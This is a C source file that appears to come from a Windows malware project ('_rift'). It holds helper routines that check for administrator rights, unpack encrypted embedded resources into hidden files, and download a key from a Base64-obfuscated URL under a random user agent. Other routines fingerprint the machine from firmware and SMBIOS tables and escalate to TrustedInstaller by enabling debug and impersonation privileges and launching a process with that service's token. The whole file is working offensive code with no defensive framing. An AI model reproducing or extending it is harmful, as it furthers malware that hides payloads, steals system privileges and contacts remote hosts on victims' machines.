#include "_rift.h"

BOOL IIsUserAdmin() {
	PSID pSId;
	BOOL bSId = AllocateAndInitializeSid(&(SID_IDENTIFIER_AUTHORITY)SECURITY_NT_AUTHORITY, 2,
		SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSId);
	if (bSId) {
		if (!CheckTokenMembership(NULL, pSId, &bSId))
			bSId = FALSE;

		FreeSid(pSId);
	}

	return bSId;
}

PVOID ELoadResourceW(
	_In_  WORD    wResID,
	_In_  PCWSTR  pResType,
	_Out_ PSIZE_T nBufferSize
) {
	HRSRC hResInfo = FindResourceW(NULL, MAKEINTRESOURCEW(wResID), pResType);
	if (hResInfo) {
		HGLOBAL hgData = LoadResource(NULL, hResInfo);
		if (hgData) {
			PVOID lpBuffer = LockResource(hgData);
			if (!lpBuffer)
				return NULL;

			*nBufferSize = SizeofResource(NULL, hResInfo);
			if (!*nBufferSize)
				return NULL;

			return lpBuffer;
		}
	}

	return NULL;
}

PDWORD EGetProcessIdbyName(
	_In_  PCWSTR  pProcessName,
	_Out_ PSIZE_T nProcesses
) {
	HANDLE hPSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hPSnap == INVALID_HANDLE_VALUE)
		return 0;

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	PDWORD pProcesses = NULL;
	if (Process32FirstW(hPSnap, &pe32)) {
		*nProcesses = 0;
		do {
			if (!lstrcmpiW(pe32.szExeFile, pProcessName)) {
				if (pProcesses)
					pProcesses = ReAllocMemory(pProcesses, sizeof(DWORD) * *nProcesses);
				else
					pProcesses = AllocMemory(sizeof(DWORD));

				pProcesses[*nProcesses] = pe32.th32ProcessID;
				(*nProcesses)++;
			}
		} while (Process32Next(hPSnap, &pe32));
	}

	CloseHandle(hPSnap);
	return pProcesses;
}

PVOID AllocReadFileW(
	_In_  PCWSTR  szFileName,
	_Out_ PSIZE_T nFileSize
) {
	PVOID pRet = NULL;
	HANDLE hFile = CreateFileW(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return NULL;

	LARGE_INTEGER liFS;
	BOOL bT = GetFileSizeEx(hFile, &liFS);
	if (!bT || (liFS.HighPart || !liFS.LowPart))
		goto EXIT;

	PVOID pFile = AllocMemory(liFS.LowPart);
	if (!pFile)
		goto EXIT;

	bT = ReadFile(hFile, pFile, liFS.LowPart, nFileSize, NULL);
	if (!bT) {
		FreeMemory(pFile);
		goto EXIT;
	}

	pRet = pFile;
EXIT:
	CloseHandle(hFile);
	return pRet;
}

BOOL WriteFileCW(
	_In_ PCWSTR pFileName,
	_In_ PVOID  pBuffer,
	_In_ SIZE_T nBuffer
) {
	HANDLE hFile = CreateFileW(pFileName, GENERIC_RW, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
	if (hFile) {
		DWORD dwT;
		BOOL bT = WriteFile(hFile, pBuffer, nBuffer, &dwT, NULL);
		CloseHandle(hFile);

		return bT;
	} else
		return FALSE;
}

PCWSTR GetFileNameFromPathW(
	_In_ PCWSTR pPath
) {
	SIZE_T nResult;
	StringCchLengthW(pPath, MAX_PATH, &nResult);

	for (UINT16 i = nResult; i > 2; i--)
		if (pPath[i - 1] == L'\\')
			return pPath + i;

	return NULL;
}

BOOL EExtractResource(
	_In_ PCWSTR szFileName,
	_In_ WORD   wResID
) {
	SIZE_T nData;
	PVOID pData = EUnpackResource(&g_PIB->sCIB.WK, wResID, &nData);
	BOOL bT = WriteFileCW(szFileName, pData, nData);
	FreeMemory(pData);
	return bT;
}

// Only Test rn but might be implemented further
PVOID IDownloadKey() {
	PCWSTR szAgent = EAllocRandomBase64StringW(NULL, 8, 16);
	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	if (!hNet)
		return NULL;
	FreeMemory(szAgent);

	PCSTR szB64URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xpbWEtWC1Db2RpbmcvV2luMzIuX3JpZnQvbWFzdGVyL19yaWZ0L21haW4uYz90b2tlbj1BSVNMVElGQkxFWE5IREJIWDZaMkZPUzYzUUozVQA=";
	SIZE_T nURL;
	PCSTR szURL = EBase64DecodeA(szB64URL, 156, &nURL);
	HINTERNET hUrl = InternetOpenUrlA(hNet, szURL, NULL, 0, NULL, NULL);
	if (!hUrl)
		return NULL;
	FreeMemory(szURL);

	PVOID pBuffer = AllocMemory(AES_BLOB_SIZE);
	SIZE_T nRead;
	InternetReadFile(hUrl, pBuffer, AES_BLOB_SIZE, &nRead);

	InternetCloseHandle(hUrl);
	InternetCloseHandle(hNet);
	if ((nRead != AES_BLOB_SIZE) || ((DWORD)pBuffer != 0x4d42444b)) {
		FreeMemory(pBuffer);
		return NULL;
	}

	return pBuffer;
}

// so apperently every kind of data im grabbing is different
// so fuck me in the ass, this is basically a session id now
VOID IGenerateSessionId(
	_Out_ PUUID pSId
) {
	// Prepare Hashing
	BCRYPT_ALG_HANDLE ah;
	BCryptOpenAlgorithmProvider(&ah, BCRYPT_MD5_ALGORITHM, NULL, NULL);
	BCRYPT_HASH_HANDLE hh;
	BCryptCreateHash(ah, &hh, NULL, 0, NULL, 0, NULL);

	CONST STATIC DWORD dwFTPS[] = {
		'ACPI', 'FIRM', 'RSMB'
	};
	for (UINT8 i = 0; i < sizeof(dwFTPS) / sizeof(DWORD); i++) {
		// Enumerate Table Entries
		SIZE_T nTableId = EnumSystemFirmwareTables(dwFTPS[i], NULL, 0);
		PDWORD pTableId = AllocMemory(nTableId);
		EnumSystemFirmwareTables(dwFTPS[i], pTableId, nTableId);

		for (UINT8 j = 0; j < nTableId / sizeof(DWORD); j++) {
			// Get Table
			SIZE_T nTable = GetSystemFirmwareTable(dwFTPS[i], pTableId[j], NULL, 0);
			PVOID pTable = AllocMemory(nTable);
			GetSystemFirmwareTable(dwFTPS[i], pTableId[j], pTable, nTable);

			// Hash Table
			BCryptHashData(hh, pTable, nTable, NULL);
			FreeMemory(pTable);
		}

		FreeMemory(pTableId);
	}

	// Finish Hashing
	BCryptFinishHash(hh, pSId, MD5_SIZE, NULL);
	BCryptDestroyHash(hh);
	BCryptCloseAlgorithmProvider(ah, NULL);
}

VOID IGenerateHardwareId(
	_Out_ PUUID pHwId
) {
	// Get SMBios Table
	typedef struct _RawSMBIOSData {
		BYTE  Used20CallingMethod;
		BYTE  SMBIOSMajorVersion;
		BYTE  SMBIOSMinorVersion;
		BYTE  DmiRevision;
		DWORD Length;
		BYTE  SMBIOSTableData[];
	} SMBIOS, * PSMBIOS;
	DWORD dwTable;
	EnumSystemFirmwareTables('RSMB', &dwTable, sizeof(dwTable));
	SIZE_T nTable = GetSystemFirmwareTable('RSMB', dwTable, NULL, 0);
	PSMBIOS smTable = AllocMemory(nTable);
	GetSystemFirmwareTable('RSMB', dwTable, smTable, nTable);

	// Prepare Hashing
	BCRYPT_ALG_HANDLE ah;
	BCryptOpenAlgorithmProvider(&ah, BCRYPT_MD5_ALGORITHM, NULL, NULL);
	BCRYPT_HASH_HANDLE hh;
	BCryptCreateHash(ah, &hh, NULL, 0, NULL, 0, NULL);

	// Get First Entry
	typedef struct _SMBIOSTableHeader {
		BYTE bType;
		BYTE nLength;
		WORD wHandle;
	} SMTABLEHDR, * PSMTABLEHDR;
	PSMTABLEHDR pEntry = smTable->SMBIOSTableData;
	while (pEntry->bType != 127) {
		// Start of String Table
		PVOID pStringTable = (PTR)pEntry + pEntry->nLength;

		// Get Entry Size and next Entry Address
		while (*((PWORD)pStringTable) != (WORD)0x0000)
			((PTR)pStringTable)++;
		SIZE_T nEntry = ((PTR)pStringTable + 2) - (PTR)pEntry;

		// Test if Entry should be hashed
		CONST STATIC BYTE bTypes[] = {
			0x00, // BIOS            : O
			0x04, // Processor       : S
			0x07, // Cache           : O
			0x08, // Ports           : O
			0x09, // Slots           : O
			0x10, // Physical Memory : O
			0x11, // Memory Devices  : O
			0x02  // Baseboard       : X
		};
		for (UINT8 i = 0; i < sizeof(bTypes); i++) {
			if (pEntry->bType == bTypes[i]) {
				if (pEntry->bType == 4) {
					// Avoid "Current Speed" Field
					BCryptHashData(hh, pEntry, 0x16, NULL);
					BCryptHashData(hh, (PTR)pEntry + 0x18, nEntry - 0x18, NULL);
				} else
					BCryptHashData(hh, pEntry, nEntry, NULL);
				break;
			}
		}

		// Set Address of next Entry
		(PTR)pEntry += nEntry;
	}

	// Finish Hashing
	BCryptFinishHash(hh, pHwId, sizeof(*pHwId), NULL);
	BCryptDestroyHash(hh);
	BCryptCloseAlgorithmProvider(ah, NULL);
	FreeMemory(smTable);
}

BOOL ERunAsTrustedInstaller(
	_In_     PCWSTR szFileName,
	_In_     PCWSTR szCmdLine,
	_In_opt_ PCWSTR szDirectory
) {
	BOOL LE = 0;

	SC_HANDLE hSCM = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	LE = GetLastError();
	if (!hSCM)
		return LE;
	SC_HANDLE hSer = OpenServiceW(hSCM, L"TrustedInstaller", GENERIC_EXECUTE);
	LE = GetLastError();
	if (!hSer)
		return LE;
	BOOL bS = StartServiceW(hSer, NULL, NULL);

	SIZE_T nProc;
	PDWORD pProc = EGetProcessIdbyName(L"TrustedInstaller.exe", &nProc);
	bS = EAdjustPrivilege(SE_DEBUG_NAME, TRUE);
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pProc[0]);
	LE = GetLastError();

	HANDLE hTok;
	EAdjustPrivilege(SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
	EAdjustPrivilege(SE_IMPERSONATE_NAME, TRUE);

	bS = OpenProcessToken(hProc, TOKEN_DUPLICATE, &hTok);
	LE = GetLastError();

	// DuplicateToken(hTok, )

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	PWSTR pCmdLineC;
	if (szCmdLine) {
		SIZE_T nCmdLine;
		StringCchLengthW(szCmdLine, PATHCCH_MAX_CCH, &nCmdLine);
		pCmdLineC = (PWSTR)AllocMemory((nCmdLine + 1) * sizeof(WCHAR));
		CopyMemory(pCmdLineC, szCmdLine, (nCmdLine + 1) * sizeof(WCHAR));
	} else
		pCmdLineC = NULL;
	bS = CreateProcessAsUserW(hTok, szFileName, pCmdLineC, NULL, NULL, FALSE, NULL, NULL, szDirectory, &si, &pi);
	if (bS) {
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	return 0;
}